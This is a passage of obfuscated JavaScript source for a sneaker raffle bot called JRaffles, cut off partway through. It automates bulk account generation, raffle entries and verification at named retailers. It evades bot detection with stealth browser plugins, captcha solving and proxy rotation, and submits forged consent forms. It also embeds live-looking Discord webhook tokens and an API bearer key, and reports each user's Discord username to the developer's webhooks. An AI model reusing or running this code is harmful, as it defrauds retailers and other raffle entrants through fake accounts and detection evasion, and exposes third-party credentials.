const { EmbedBuilder: _0x59476a } = require('discord.js');
var _0x5cdc19 = require('exe');
const { execFile: _0x559675 } = require('child_process'), _0x4baac5 = require('puppeteer-extra'), _0x318e48 = require('puppeteer-extra-plugin-recaptcha'), _0x3f14b2 = require('puppeteer-extra-plugin-stealth'), _0x5ecce5 = require('chalk'), _0x992352 = require('node-bash-title'), _0x536860 = require('fs'), _0x507898 = require('axios'), _0x4e7053 = require('papaparse');
var _0x26d829 = require('random-name');
const _0x262614 = require('request');
var _0x5a99d6 = require('prompt');
const _0x5d48fa = _0x262614['jar']();
var _0x5690b2 = {};
const _0x27c0ac = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x16f894 = '1067398856721051719/2gS-h641y_RoqR-KZ5aOcrnDfvvXNQIz4uQv8eA8A5_nsRSJlaCaStreLwCu5lmUjO4H', _0x1c7136 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x1ee905 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x3cf61b = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x22b928 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x1b3dd7 = 'https://discord.com/api/webhooks/', _0x4dc254 = '' + _0x1b3dd7 + _0x1c7136, _0x10deb2 = '' + _0x1b3dd7 + _0x1ee905, _0x4c279b = '' + _0x1b3dd7 + _0x27c0ac, _0x51b669 = '' + _0x1b3dd7 + _0x16f894, _0x319480 = '' + _0x1b3dd7 + _0x3cf61b, _0x1ea743 = '' + _0x1b3dd7 + _0x22b928;
const _0x28ec5f = JSON['parse'](_0x536860['readFileSync']('../package.json', 'utf-8')), _0x2f0e91 = _0x28ec5f['version'];
var _0x3dc3e8, _0x261ffa, _0x2b953d, _0xe5b247, _0x34c112, _0x51e3af, _0x5746a9, _0x1d9a80;
const _0x143580 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x2f3a5c = ![];
const _0x5aad92 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x39cea4 = '0123456789';
var _0x551705 = _0x5aad92['split']('');
const _0x2221a0 = require('auto-git-update'), { PageEmittedEvents: _0x51b806 } = require('puppeteer'), { getRandomValues: _0x52880e } = require('crypto'), { resolve: _0x4cc56c } = require('path'), { Console: _0xc9b91f } = require('console'), _0x7e2f36 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x434fd7 = new _0x2221a0(_0x7e2f36);
async function _0x21e85f() {
    _0x34c112 = _0x536860['readdirSync']('../proxies'), _0xe5b247 = _0x536860['readdirSync']('../tasks'), !_0x536860['existsSync']('../accounts/fenom.csv') && _0x536860['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x536860['existsSync']('../accounts/bstn.csv') && _0x536860['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), _0x5690b2 = JSON['parse'](_0x536860['readFileSync']('../settings.json', 'utf-8')), !_0x5690b2['delay'] && (_0x5690b2['delay'] = 0x2710, _0x536860['writeFileSync']('../settings.json', JSON['stringify'](_0x5690b2))), !_0x5690b2['captchaKey'] && (_0x5690b2['captchaKey'] = '', _0x536860['writeFileSync']('../settings.json', JSON['stringify'](_0x5690b2))), !_0x5690b2['useRandomProxy'] && (_0x5690b2['useRandomProxy'] = !![], _0x536860['writeFileSync']('../settings.json', JSON['stringify'](_0x5690b2))), !_0x5690b2['webhook'] && (_0x5690b2['webhook'] = '', _0x536860['writeFileSync']('../settings.json', JSON['stringify'](_0x5690b2))), _0x5690b2['MahaDelay'] = _0x5690b2['delay'], _0x1b3dd7 = _0x5690b2['webhook'], _0x51e3af = _0x5690b2['licenseKey'];
}
let _0x3347fc, _0x1752eb = [], _0x374e33;
const _0x73378f = _0x369a6d => new Promise(_0x2fe693 => setTimeout(_0x2fe693, _0x369a6d));
function _0x45f419(_0x2004e3, _0x580d32) {
    return Math['floor'](Math['random']() * (_0x580d32 - _0x2004e3 + 0x1) + _0x2004e3);
}
async function _0x5c679c(_0x417d32) {
    return _0x507898['get']('https://api.hyper.co/v4/licenses/' + _0x417d32, { 'headers': { 'Authorization': 'Bearer\x20' + _0x143580 } })['then'](_0x44868f => _0x44868f['data'])['catch'](() => null);
}
;
async function _0x35d023(_0x185555) {
    console['clear']();
    if (_0x185555 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x8cf7 = await _0x5a99d6['get']('License');
        if (_0x8cf7['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x73378f(0xbb8), _0x35d023(_0x185555);
        _0x185555 = _0x8cf7['License'], _0x5690b2['licenseKey'] = _0x185555, _0x51e3af = _0x185555, _0x536860['writeFileSync']('../settings.json', JSON['stringify'](_0x5690b2));
    }
    console['log']('Checking\x20license\x20' + _0x51e3af + '...'), await _0x73378f(0x320);
    const _0x4f7e72 = await _0x5c679c(_0x185555);
    _0x5746a9 = JSON['stringify'](_0x4f7e72['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x1d9a80 = JSON['stringify'](_0x4f7e72['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x4f7e72)
        return console['log']('License\x20not\x20found');
    if (!_0x4f7e72['user'])
        return console['log']('License\x20not\x20bound');
    return _0x4f7e72['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x2f3a5c = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x2f3a5c = ![]);
}
async function _0x502364() {
    var _0x2a71d9 = await _0x5a99d6['get']('Module');
    return console['clear'](), _0x2a71d9['Module'];
}
;
async function _0x4f1171() {
    var _0x3ed31f = await _0x5a99d6['get']('Setting');
    return console['clear'](), _0x3ed31f['Setting'];
}
async function _0x54b010() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0xe3847e = 0x0; _0xe3847e < _0xe5b247['length']; _0xe3847e++) {
        console['log']('\x20(' + _0xe3847e + ')\x20' + _0xe5b247[_0xe3847e]);
    }
    console['log']('');
    var _0x57df40 = await _0x5a99d6['get']('Task');
    if (_0x57df40['Task'] > _0xe5b247['length'] - 0x1 || isNaN(_0x57df40['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x73378f(0x3e8), _0x54b010();
    var _0x57c2c4 = _0x536860['readFileSync']('../tasks/' + _0xe5b247[_0x57df40['Task']], 'utf-8');
    return _0x2b953d = _0x4e7053['parse'](_0x57c2c4, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x5ecce5['blue'](_0xe5b247[_0x57df40['Task']])), _0x3dc3e8 = _0xe5b247[_0x57df40['Task']], _0x2b953d;
}
async function _0xaeb791() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0xc1ed2d = 0x0; _0xc1ed2d < _0x34c112['length']; _0xc1ed2d++) {
        console['log']('\x20(' + _0xc1ed2d + ')\x20' + _0x34c112[_0xc1ed2d]);
    }
    console['log']('');
    var _0x2a274d = await _0x5a99d6['get']('Proxies');
    if (_0x2a274d['Proxies'] > _0x34c112['length'] - 0x1 || isNaN(_0x2a274d['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x73378f(0x3e8), _0xaeb791();
    var _0x3dbea4 = _0x536860['readFileSync']('../proxies/' + _0x34c112[_0x2a274d['Proxies']], 'utf-8')['split']('\x0a');
    let _0x3b0942 = _0x3dbea4['map']((_0x1b5839, _0x30d808) => {
        sanatizeProxy = _0x1b5839['replace']('\x0d', '');
        if (_0x3dbea4[_0x30d808 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x261ffa = _0x34c112[_0x2a274d['Proxies']], console['clear'](), _0x3b0942;
}
async function _0x37d15c() {
    var _0x5941d8 = await _0x5a99d6['get']('Value');
    return console['clear'](), _0x5941d8['Value'];
}
async function _0x58a2a4(_0x483dd9) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x88d7de = 0x0; _0x88d7de < _0x483dd9['length']; _0x88d7de++) {
        console['log']('\x20(' + _0x88d7de + ')\x20[' + _0x483dd9[_0x88d7de]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x3bab26 = await _0x5a99d6['get']('Module');
    return _0x3bab26['Module'];
}
async function _0x33f141() {
    var _0x324276 = await _0x5a99d6['get']('Password');
    return console['clear'](), _0x324276['Password'];
}
;
async function _0x3bf6be() {
    var _0x2479cd = await _0x5a99d6['get']('Links');
    return _0x2479cd['Links'];
}
;
async function _0x1feb93() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0xa0a26c = 0x0; _0xa0a26c < _0x1752eb['length']; _0xa0a26c++) {
        console['log']('\x20(' + _0xa0a26c + ')\x20' + _0x1752eb[_0xa0a26c]);
    }
    ;
    console['log']();
    let _0x3d333f = await _0x5a99d6['get']('Product');
    return console['clear'](), _0x3d333f['Product'];
}
;
function _0x18cf54() {
    var _0x4701f4 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x4701f4;
}
;
const _0x49a3de = [
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png'
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            }
        ]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg'
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg'
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png'
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png'
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'VFB8Tq',
                            'custom_source': 'Air\x20Jordan\x204\x20Seafoam',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'RW67e2',
                                '$consent_form_version': 0x7d2f63,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'WdVw7N',
                            'custom_source': 'DV3742-021',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'S8GH2D',
                                '$consent_form_version': 0x7d9216,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505'
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505'
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x278fc0(_0x3373b6, _0x269e95) {
    let _0x254f9d = { 'headers': { 'content-type': 'application/json' } };
    if (_0x2f0e91 != 'devkey') {
        await _0x507898['post'](_0x3373b6, _0x269e95, _0x254f9d);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x3553d9(_0x2f4482, _0x243f02, _0x44f31b, _0xbddd5e, _0x3d0e3f) {
    if (!_0xbddd5e && _0x44f31b == 'dev') {
        var _0x432547 = new _0x59476a()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x243f02['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x243f02['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x2f4482['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x5690b2['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x5746a9,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x2f4482['Url'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x2f0e91,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x432547['data'];
    } else {
        if (_0xbddd5e && _0x44f31b == 'dev') {
            var _0x432547 = new _0x59476a()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x243f02['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x5746a9,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x243f02['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x2f4482['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x5690b2['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x3d0e3f,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x2f4482['Url']
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x2f0e91,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x432547['data'];
        } else {
            if (_0x44f31b == 'pub') {
                var _0x432547 = new _0x59476a()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x243f02['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x243f02['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x2f4482['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x5690b2['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x2f4482['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x2f0e91,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x432547['data'];
            } else {
                if (_0x44f31b == 'acc' && !_0xbddd5e) {
                    var _0x432547 = new _0x59476a()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x243f02['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x5746a9,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x243f02['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x5690b2['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x2f0e91,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x432547['data'];
                } else {
                    if (_0x44f31b == 'acc' && _0xbddd5e) {
                        var _0x432547 = new _0x59476a()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x243f02['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x5746a9,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x3d0e3f,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x243f02['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x5690b2['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x2f0e91,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x432547['data'];
                    } else {
                        if (_0x44f31b == 'open') {
                            var _0x432547 = new _0x59476a()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x1d9a80)['addFields']({
                                'name': 'User',
                                'value': '' + _0x5746a9,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x2f0e91,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x432547['data'];
                        } else {
                            if (!_0xbddd5e && _0x44f31b == 'ver') {
                                var _0x432547 = new _0x59476a()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x243f02['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x5746a9,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x243f02['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x5690b2['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x2f0e91,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x432547['data'];
                            } else {
                                if (_0xbddd5e && _0x44f31b == 'ver') {
                                    var _0x432547 = new _0x59476a()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x243f02['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x5746a9,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x3d0e3f,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x243f02['store'],
                                        'inline': !![]
